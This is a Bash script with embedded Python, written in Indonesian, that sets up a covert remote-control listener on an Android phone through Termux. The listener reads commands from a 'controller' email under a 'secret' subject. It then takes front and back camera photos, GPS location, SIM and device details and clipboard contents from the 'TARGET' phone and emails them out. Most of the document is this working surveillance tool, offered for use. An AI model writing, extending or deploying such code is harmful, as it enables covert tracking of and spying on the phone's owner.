set -o pipefail
readonly G_CREDS_FILE="credentials.json"
readonly G_TOKEN_FILE="token.json"
readonly PY_HELPER_TOKEN="handle_token.py"
readonly PY_LISTENER="gmail_listener.py"
readonly PY_LOCAL_SERVER="local_server.py"
readonly AUTH_CODE_FILE="auth_code.tmp"
readonly CONFIG_DEVICE="device.conf"
readonly PID_FILE="listener.pid"
readonly SERVER_PID_FILE="server.pid"
readonly LOG_FILE="listener.log"
readonly PATCH_FLAG=".patch_installed"
readonly DOWNLOAD_DIR="$HOME/storage/shared/Download"
readonly REDIRECT_URI="http://localhost:8080"

readonly C_RESET='\033[0m'; readonly C_RED='\033[0;31m'; readonly C_GREEN='\033[0;32m';
readonly C_YELLOW='\033[0;33m'; readonly C_BLUE='\033[0;34m'; readonly C_PURPLE='\033[0;35m';
readonly C_CYAN='\033[0;36m'; readonly C_WHITE='\033[1;37m'; readonly C_BOLD='\033[1m';
readonly C_DIM='\033[2m';

function _log_header() { echo -e "\n${C_CYAN}--- [ $@ ] ---${C_RESET}"; }
function _log_info() { echo -e "${C_WHITE}[i] $@${C_RESET}"; }
function _log_ok() { echo -e "${C_GREEN}[✔] $@${C_RESET}"; }
function _log_warn() { echo -e "${C_YELLOW}[!] $@${C_RESET}"; }
function _log_error() { echo -e "${C_RED}[✖] $@${C_RESET}"; }

function _generate_py_scripts() {
source "$CONFIG_DEVICE"

cat << 'EOF' > "$PY_LOCAL_SERVER"
import http.server,socketserver;from urllib.parse import urlparse,parse_qs
PORT=8080;OUTPUT_FILE="auth_code.tmp"
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query_components=parse_qs(urlparse(self.path).query)
        if 'code' in query_components:
            auth_code=query_components["code"][0]
            with open(OUTPUT_FILE,"w") as f:f.write(auth_code)
            self.send_response(200);self.send_header("Content-type","text/html");self.end_headers()
            self.wfile.write(b"<html><head><title>Berhasil</title><style>body{font-family:sans-serif;background:#1a1a1a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;height:100vh;}h1{color:#4CAF50;}</style></head>")
            self.wfile.write(b"<body><h1>&#9989; Kode diterima! Proses otomatis, silakan kembali ke Termux.</h1></body></html>")
            self.server.server_close()
        else:
            self.send_response(400);self.end_headers();self.wfile.write(b"Parameter 'code' tidak ditemukan.")
with socketserver.TCPServer(("",PORT),MyRequestHandler)as server:server.serve_forever()
EOF

cat << EOF > "$PY_HELPER_TOKEN"
import sys,os;from google_auth_oauthlib.flow import Flow
if len(sys.argv)<2:print("Penggunaan: python handle_token.py <auth_code>",file=sys.stderr);sys.exit(1)
auth_code=sys.argv[1];creds_file="$G_CREDS_FILE";token_file="$G_TOKEN_FILE"
scopes=['https://www.googleapis.com/auth/gmail.modify'];redirect_uri="$REDIRECT_URI"
if not os.path.exists(creds_file):print(f"FATAL: File '{creds_file}' tidak ditemukan!",file=sys.stderr);sys.exit(1)
try:
    flow=Flow.from_client_secrets_file(creds_file,scopes,redirect_uri=redirect_uri);flow.fetch_token(code=auth_code)
    with open(token_file,'w') as token:token.write(flow.credentials.to_json())
    print(f"SUKSES: File '{token_file}' berhasil dibuat.")
except Exception as e:print(f"ERROR: Gagal menukar kode. Pastikan URI di Google Console benar. Detail: {e}",file=sys.stderr);sys.exit(1)
EOF

cat << EOF > "$PY_LISTENER"
import os,sys,subprocess,logging,base64,time,json;from google.oauth2.credentials import Credentials;from googleapiclient.discovery import build;from google.auth.transport.requests import Request;from email.mime.multipart import MIMEMultipart;from email.mime.text import MIMEText;from email.mime.base import MIMEBase;from email import encoders
SCOPES=['https.www.googleapis.com/auth/gmail.modify'];TOKEN_FILE='$G_TOKEN_FILE'
TRUSTED_SENDER='$TRUSTED_SENDER';CMD_SUBJECT='$CMD_SUBJECT';LOG_FILE='$LOG_FILE';POLL_INTERVAL=120
logging.basicConfig(level=logging.INFO,filename=LOG_FILE,filemode='a',format='%(asctime)s - %(message)s')
def send_reply(service,original_message,body_text,attachment_path=None):
    try:
        headers=original_message['payload']['headers'];to_email=next(h['value'] for h in headers if h['name'].lower()=='from');subject="Re: "+next(h['value'] for h in headers if h['name'].lower()=='subject');message=MIMEMultipart();message['to']=to_email;message['subject']=subject;message.attach(MIMEText(body_text,'plain'))
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path,'rb') as f:part=MIMEBase('application','octet-stream');part.set_payload(f.read())
            encoders.encode_base_64(part);part.add_header('Content-Disposition',f'attachment; filename="{os.path.basename(attachment_path)}"');message.attach(part)
        raw_message=base64.urlsafe_b64encode(message.as_bytes()).decode();service.users().messages().send(userId='me',body={'raw':raw_message}).execute();logging.info(f"Berhasil mengirim balasan ke {to_email}")
    except Exception as e:logging.error(f"Gagal mengirim balasan: {e}")
def execute_command(service,msg_obj,full_command):
    try:
        result_info = subprocess.run(["termux-device-info"], capture_output=True, text=True, timeout=10)
        device_data = json.loads(result_info.stdout)
        device_model = device_data.get('manufacturer', 'Unknown') + ' ' + device_data.get('model', 'Device')
        
        parts = full_command.split(':', 2)
        command = parts[1].strip().lower() if len(parts) > 1 else ""
        argument = parts[2].strip() if len(parts) > 2 else ""
        logging.info(f"Mengeksekusi: '{command}' dengan arg: '{argument}'")
        output_file,reply_body=None,f"Perintah '{command}' telah selesai dieksekusi."
        
        if command=='ss':
            output_file,reply_body=os.path.expanduser("~/screenshot.png"),f"✅ [ID: {device_model}]\nScreenshot layar perangkat terlampir! 📸"
        elif command=='foto-depan':
            output_file,reply_body=os.path.expanduser("~/foto_depan.jpg"),f"✅ [ID: {device_model}]\nFoto dari kamera DEPAN terlampir! 🤳"
            subprocess.run(["termux-camera-photo","-c","1",output_file],timeout=25,check=True)
        elif command=='foto-belakang':
            output_file,reply_body=os.path.expanduser("~/foto_belakang.jpg"),f"✅ [ID: {device_model}]\nFoto dari kamera BELAKANG terlampir! 📷"
            subprocess.run(["termux-camera-photo","-c","0",output_file],timeout=25,check=True)
        elif command=='lokasi':
            result=subprocess.run(["termux-location"],capture_output=True,text=True,timeout=30,check=True)
            try:
                loc_data=json.loads(result.stdout)
                lat,lon=loc_data.get('latitude'),loc_data.get('longitude')
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                reply_body=f"🛰️ [ID: {device_model}]\nLokasi Terdeteksi!\n\nLatitude: {lat}\nLongitude: {lon}\n\n📍 Buka di Google Maps:\n{maps_link}"
            except:
                reply_body=f"⚠️ [ID: {device_model}]\nGPS berhasil diakses, tapi gagal parse JSON:\n\n{result.stdout}"
        elif command=='info':
            result=subprocess.run(["termux-device-info"],capture_output=True,text=True,timeout=15,check=True)
            reply_body=f"📱 [ID: {device_model}]\nInfo Perangkat:\n\n{result.stdout or 'Gagal didapat.'}"
        elif command=='sim-info':
            result=subprocess.run(["termux-telephony-deviceinfo"],capture_output=True,text=True,timeout=15,check=True)
            reply_body=f"💳 [ID: {device_model}]\nInfo SIM Card & Jaringan:\n\n{result.stdout or 'Gagal didapat.'}"
        elif command=='baterai':
            result=subprocess.run(["termux-battery-status"],capture_output=True,text=True,timeout=10,check=True)
            try:
                battery_data=json.loads(result.stdout)
                status=battery_data.get('status','N/A');plugged=battery_data.get('plugged','N/A')
                reply_body=f"🔋 [ID: {device_model}]\nStatus Baterai:\n\nPersentase: {battery_data.get('percentage','N/A')}%\nStatus: {status}\nPengisian: {plugged}"
            except:
                reply_body=f"⚠️ [ID: {device_model}]\nInfo Baterai Gagal Di-parse:\n\n{result.stdout}"
        elif command=='clipboard':
            result=subprocess.run(["termux-clipboard-get"],capture_output=True,text=True,timeout=10,check=True)
            reply_body=f"📋 [ID: {device_model}]\nIsi Clipboard:\n\n{result.stdout or '(Clipboard kosong)'}"
        elif command=='senter-on':
            subprocess.run(["termux-torch","on"],check=True)
            reply_body=f"💡 [ID: {device_model}]\nSenter dinyalakan!"
        elif command=='senter-off':
            subprocess.run(["termux-torch","off"],check=True)
            reply_body=f"⚫ [ID: {device_model}]\nSenter dimatikan."
        elif command=='getar':
            subprocess.run(["termux-vibrate","-d","1000"],check=True)
            reply_body=f"📳 [ID: {device_model}]\nPerangkat digetarkan selama 1 detik."
        elif command=='bicara' and argument:
            subprocess.run(["termux-tts-speak",argument],check=True)
            reply_body=f"🗣️ [ID: {device_model}]\nPerangkat mengatakan: '{argument}'"
        elif command=='help':
            reply_body = (f"🤖 [ID: {device_model}] Daftar Perintah (Format: Maww:<perintah>):\n\n"
                          f"ss              -> Screenshot\n"
                          f"foto-depan      -> Ambil foto kamera depan\n"
                          f"foto-belakang   -> Ambil foto kamera belakang\n"
                          f"lokasi          -> Dapatkan lokasi GPS (link Google Maps)\n"
                          f"info            -> Info detail perangkat\n"
                          f"sim-info        -> Info SIM Card & jaringan\n"
                          f"baterai         -> Cek status baterai\n"
                          f"clipboard       -> Lihat isi clipboard\n"
                          f"senter-on       -> Nyalakan senter\n"
                          f"senter-off      -> Matikan senter\n"
                          f"getar           -> Getarkan perangkat\n"
                          f"bicara:<teks>   -> Buat HP bicara (contoh: Maww:bicara:halo bos)\n"
                          f"exit-listener   -> Hentikan listener dari jarak jauh")
        elif command=='exit-listener':
            reply_body=f"👋 [ID: {device_model}]\nListener dihentikan. Sampai jumpa!"
            send_reply(service, msg_obj, reply_body); logging.info("Listener dihentikan via remote."); sys.exit(0)
        else:
            reply_body=f"❓ [ID: {device_model}]\nPerintah '{command}' tidak dikenali. Ketik 'Maww:help' untuk bantuan."
        send_reply(service, msg_obj, reply_body, output_file)
    except subprocess.CalledProcessError as cpe:
        error_msg = f"❌ [ID: {device_model}]\nGAGAL EKSEKUSI (Code: {cpe.returncode}).\nPerintah Termux-API gagal atau izin kurang.\nError: {cpe.stderr.strip() or 'Tidak ada detail error.'}"
        logging.error(error_msg);send_reply(service, msg_obj, error_msg)
    except Exception as e:
        error_msg = f"💥 [ID: {device_model}]\nTERJADI ERROR FATAL.\nCek log untuk detail. Error: {e}"
        logging.error(f"Error saat eksekusi: {e}");send_reply(service, msg_obj, error_msg)
def main_loop():
    creds=Credentials.from_authorized_user_file(TOKEN_FILE,SCOPES)
    gmail_service=build('gmail','v1',credentials=creds)
    logging.info("Listener service dimulai."); print("Listener kini berjalan di background...")
    while True:
        try:
            if not creds.valid:
                if creds.expired and creds.refresh_token:creds.refresh(Request())
                else:logging.error("Token tidak valid. Jalankan ulang setup.");sys.exit(1)
            
            q=f"from:{TRUSTED_SENDER} is:unread subject:'{CMD_SUBJECT}'";results=gmail_service.users().messages().list(userId='me',labelIds=['INBOX'],q=q).execute();messages=results.get('messages',[])
            for message_info in messages:
                msg_id=message_info['id'];msg_obj=gmail_service.users().messages().get(userId='me',id=msg_id).execute()
                if msg_obj:execute_command(gmail_service, msg_obj, msg_obj['snippet'])
                gmail_service.users().messages().modify(userId='me',id=msg_id,body={'removeLabelIds':['UNREAD']}).execute()
            time.sleep(POLL_INTERVAL)
        except Exception as e:logging.error(f"Error pada loop utama: {e}");time.sleep(POLL_INTERVAL*2)
if __name__=='__main__':main_loop()
EOF
}

function setup() {
    clear; display_header
    _log_header "Setup / Konfigurasi Ulang"
    rm -f "$G_TOKEN_FILE" "$SERVER_PID_FILE" "$AUTH_CODE_FILE" "$CONFIG_DEVICE"

    _log_info "Membuat file konfigurasi baru..."
    read -r -p "$(echo -e "${C_CYAN}> Masukkan Alamat Email Gmail TARGET (yang ada di HP ini): ${C_RESET}")" my_email_input
    read -r -p "$(echo -e "${C_CYAN}> Masukkan Alamat Email PENGONTROL (email Anda untuk kirim perintah): ${C_RESET}")" trusted_sender_input
    read -r -p "$(echo -e "${C_CYAN}> Masukkan Subjek Perintah Rahasia (misal: 'PerintahJarakJauh'): ${C_RESET}")" subject_input
    
    echo "MY_EMAIL=\"$my_email_input\"" > "$CONFIG_DEVICE"
    echo "TRUSTED_SENDER=\"$trusted_sender_input\"" >> "$CONFIG_DEVICE"
    echo "CMD_SUBJECT=\"$subject_input\"" >> "$CONFIG_DEVICE"
    _log_ok "Konfigurasi berhasil disimpan di '$CONFIG_DEVICE'."

    _log_info "Memeriksa file kredensial '$G_CREDS_FILE'..."
    if [ ! -f "$G_CREDS_FILE" ]; then
        if ! cp "$DOWNLOAD_DIR/$G_CREDS_FILE" .; then
            _log_error "GAGAL: '$G_CREDS_FILE' tidak ditemukan di folder Download."
            return
        fi
        _log_ok "Berhasil menyalin '$G_CREDS_FILE'."
    fi
    
    _log_info "Membuat script Python yang dibutuhkan..."
    _generate_py_scripts

    _log_info "Membaca Client ID dari '$G_CREDS_FILE'..."
    local client_id; client_id=$(grep -o '"client_id": *"[^"]*"' "$G_CREDS_FILE" | grep -o '"[^"]*"$' | tr -d '"')
    if [ -z "$client_id" ]; then _log_error "GAGAL: Tidak bisa membaca client_id dari '$G_CREDS_FILE'."; return; fi
    
    local scope="https://www.googleapis.com/auth/gmail.modify"
    local auth_url="https://accounts.google.com/o/oauth2/v2/auth?scope=${scope}&access_type=offline&response_type=code&prompt=select_account&redirect_uri=${REDIRECT_URI}&client_id=${client_id}"

    _log_header "INSTRUKSI OTENTIKASI"
    _log_info "Menjalankan server lokal di background..."
    nohup python "$PY_LOCAL_SERVER" >/dev/null 2>&1 &
    echo $! > "$SERVER_PID_FILE"
    sleep 1

    _log_ok "Server berjalan! (PID: $(cat "$SERVER_PID_FILE"))"
    _log_warn "Langkah 1: COPY dan BUKA URL di bawah ini di browser."
    echo -e "${C_BOLD}${C_YELLOW}    ${auth_url}${C_RESET}"
    _log_warn "Langkah 2: Login dengan akun Gmail TARGET (${C_CYAN}$my_email_input${C_RESET}) & berikan izin."
    _log_warn "Langkah 3: Halaman browser akan menampilkan 'Kode diterima'."
    _log_info "Script ini menunggu kode otorisasi dari server..."

    local count=0
    while [ ! -f "$AUTH_CODE_FILE" ]; do
        echo -n "."
        sleep 2
        count=$((count+1))
        if [ $count -gt 150 ]; then
            _log_error "\nTimeout! Gagal mendapatkan kode dalam 5 menit."
            if [ -f "$SERVER_PID_FILE" ]; then kill "$(cat "$SERVER_PID_FILE")"; rm "$SERVER_PID_FILE"; fi
            return
        fi
    done
    
    echo
    local auth_code; auth_code=$(cat "$AUTH_CODE_FILE")
    _log_ok "Kode otorisasi berhasil diterima!"
    _log_info "Menukar kode dengan token akses..."
    
    if python "$PY_HELPER_TOKEN" "$auth_code"; then
        _log_ok "🎉 SETUP SELESAI! Otorisasi berhasil."
    else
        _log_error "SETUP GAGAL. Gagal menukar kode dengan token."
    fi

    rm -f "$AUTH_CODE_FILE" "$SERVER_PID_FILE"
}

function start() { clear;display_header;_log_header "Memulai Listener"; if [ ! -f "$CONFIG_DEVICE" ]||[ ! -f "$G_TOKEN_FILE" ];then _log_error "Konfigurasi/token tidak ditemukan. Jalankan 'Setup' (3) dulu.";return;fi;if [ -f "$PID_FILE" ]&&ps -p "$(cat "$PID_FILE")" >/dev/null;then _log_warn "Listener sudah berjalan.";return;fi;_generate_py_scripts;nohup python "$PY_LISTENER" >/dev/null 2>&1 & echo $! > "$PID_FILE";_log_ok "Listener dimulai (PID: $(cat "$PID_FILE")). Cek log di '$LOG_FILE'." ;}
function stop() { clear;display_header;_log_header "Menghentikan Listener"; if [ ! -f "$PID_FILE" ];then _log_warn "Listener tidak sedang berjalan.";return;fi;local pid; pid=$(cat "$PID_FILE");if ps -p "$pid" >/dev/null;then kill "$pid";rm -f "$PID_FILE";_log_ok "Listener (PID: $pid) telah dihentikan.";else _log_warn "Proses (PID: $pid) tidak ditemukan. File PID dihapus.";rm -f "$PID_FILE";fi;}
function logs() { clear;display_header;_log_header "Melihat Log Realtime";if [ ! -f "$LOG_FILE" ];then _log_warn "File log belum ada.";return;fi;_log_info "Menampilkan log... Tekan ${C_BOLD}Ctrl+C${C_RESET} untuk keluar."; echo; tail -f "$LOG_FILE" ;}
function cleanup() { clear;display_header;_log_header "Pembersihan Total";_log_warn "Ini akan menghapus SEMUA file terkait script ini.";
    read -r -p "$(echo -e "${C_YELLOW}> Anda yakin ingin melanjutkan? (y/n): ${C_RESET}")" confirm
    if [[ "$confirm" =~ ^[Yy]$ ]];then stop >/dev/null 2>&1||true;_log_info "Menghapus file...";rm -f "$CONFIG_DEVICE" "$G_TOKEN_FILE" "$G_CREDS_FILE" "$PY_HELPER_TOKEN" "$PY_LISTENER" ".patch_installed" "$LOG_FILE" "$PID_FILE" "$SERVER_PID_FILE" "$PY_LOCAL_SERVER" "$AUTH_CODE_FILE";_log_ok "Pembersihan selesai.";else _log_info "Pembersihan dibatalkan.";fi;}
function run_patcher() { set -e;clear;display_header;_log_header "Persiapan Lingkungan Otomatis";
    readonly PKGS=("python" "termux-api" "coreutils" "curl");
    readonly PYREQS=("google-api-python-client" "google-auth-httplib2" "google-auth-oauthlib");_log_info "${C_BOLD}1/3:${C_RESET} Memeriksa paket sistem...";pkg update -y >/dev/null 2>&1;for p in "${PKGS[@]}";do if ! dpkg -s "$p">/dev/null 2>&1;then _log_warn "Menginstal '$p'... (mungkin butuh waktu)";pkg install -y "$p";fi;done;_log_ok "Paket sistem siap.";_log_info "${C_BOLD}2/3:${C_RESET} Memeriksa library Python...";for r in "${PYREQS[@]}";do if ! pip show "$r">/dev/null 2>&1;then _log_warn "Menginstal '$r'... (mungkin butuh waktu)";pip install --no-cache-dir "$r";fi;done;_log_ok "Library Python siap.";_log_info "${C_BOLD}3/3:${C_RESET} Izin penyimpanan...";if [ ! -d "$HOME/storage/shared" ];then termux-setup-storage;_log_warn "Izin diminta...";sleep 5;fi;_log_ok "Izin penyimpanan siap.";echo;_log_ok "✅ LINGKUNGAN SUDAH SIAP! ✅";set +e;}

function device_commands_menu() {
    clear; display_header
    _log_header "MENU PERINTAH REMOTE (Termux-API)"
    source "$CONFIG_DEVICE"
    _log_warn "${C_BOLD}PENTING:${C_RESET} HP target HARUS punya app ${C_CYAN}Termux:API${C_RESET} dan listener harus aktif."
    _log_info "Kirim email dari: ${C_YELLOW}\"$TRUSTED_SENDER\"${C_RESET}"
    _log_info "Kirim email ke:   ${C_CYAN}\"$MY_EMAIL\"${C_RESET}"
    _log_info "Dengan Subjek:    ${C_YELLOW}\"$CMD_SUBJECT\"${C_RESET}"
    _log_info "Isi email adalah perintah, contoh: ${C_GREEN}Maww:lokasi${C_RESET}"
    echo
    echo -e "${C_BOLD}Daftar Perintah:${C_RESET}"
    echo -e "${C_WHITE}  ss              -> Screenshot\n  foto-depan      -> Foto kamera depan\n  foto-belakang   -> Foto kamera belakang\n  lokasi          -> Lacak GPS (dapat link Google Maps)\n  info            -> Info detail perangkat\n  sim-info        -> Info SIM card & jaringan\n  baterai         -> Status baterai\n  clipboard       -> Lihat isi clipboard\n  senter-on/off   -> Kontrol senter\n  getar           -> Getarkan HP\n  bicara:<teks>   -> Buat HP bicara (misal: Maww:bicara:kamu dimana)\n  exit-listener   -> Matikan listener dari jarak jauh${C_RESET}"
    echo
    read -r -p "$(echo -e "${C_CYAN}Tekan [Enter] untuk kembali ke Menu Utama... ${C_RESET}")"
}

function display_header() {
    local status_text; local status_color; local pid_text=""
    if [ -f "$PID_FILE" ] && ps -p "$(cat "$PID_FILE")" >/dev/null; then
        status_text="A K T I F"; status_color="$C_GREEN"
        pid_text="(PID: $(cat "$PID_FILE"))"
    else
        status_text="TIDAK AKTIF"; status_color="$C_RED"
    fi
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
    echo -e "${C_BOLD}${C_WHITE} Maww Script v43 (Remote Control)${C_RESET}"
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
    printf "%-10s %-20s %s\n" " Status" ": ${status_color}${status_text}${C_RESET}" "${C_YELLOW}${pid_text}${C_RESET}"
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
}

function display_menu() {
    local device_menu_option="  7) 📖  Daftar Perintah Remote"
    if [ ! -f "$CONFIG_DEVICE" ]; then
        device_menu_option="${C_DIM}  7) 📖  Daftar Perintah (Harus Setup dulu!)${C_RESET}"
    fi

    echo
    echo -e "${C_WHITE}  1) ▶️   Mulai Listener"
    echo -e "${C_WHITE}  2) ⏹️   Hentikan Listener"
    echo -e "${C_WHITE}  3) ⚙️   Setup / Konfigurasi Ulang"
    echo -e "${C_WHITE}  4) 📜  Lihat Log Realtime"
    echo -e "${C_WHITE}  5) 🛠️   Perbaiki Lingkungan"
    echo -e "${C_WHITE}  6) 🗑️   Hapus Semua Konfigurasi"
    echo -e "${device_menu_option}"
    echo -e "${C_WHITE}  8) 🚪  Keluar${C_RESET}"
    echo
    
    read -r -p "$(echo -e "${C_CYAN}  Pilih Opsi [1-8] > ${C_RESET}")" choice
    
    case $choice in
        '1') start;; '2') stop;; '3') setup;; '4') logs;;
        '5') run_patcher; touch .patch_installed ;;
        '6') cleanup;;
        '7') if [ -f "$CONFIG_DEVICE" ]; then device_commands_menu; else _log_error "Harus Setup (3) dulu!"; fi;;
        '8') echo -e "\n${C_PURPLE}Sampai jumpa!${C_RESET}"; exit 0;;
        *) _log_error "Pilihan tidak valid: $choice. Masukkan angka 1-8.";;
    esac
    echo -e "\n${C_DIM}Tekan [Enter] untuk kembali ke menu...${C_RESET}"
    read -r
}

function main() {
    if [ ! -f ".patch_installed" ]; then
        clear; display_header
        _log_header "Selamat Datang di Maww Script!"
        _log_info "Ini eksekusi pertama, skrip akan menyiapkan lingkungan."
        _log_warn "Pastikan 'credentials.json' ada di folder Download."
        _log_warn "Pastikan URI 'http://localhost:8080' sudah ditambahkan di Google Console."
        read -p "    Tekan [Enter] untuk memulai persiapan..."
        run_patcher
        touch .patch_installed
        read -p "    Tekan [Enter] untuk lanjut ke menu utama..."
    fi
    if [ -f "$SERVER_PID_FILE" ]; then rm -f "$SERVER_PID_FILE"; fi
    while true; do
        clear
        display_header
        display_menu
    done
}

main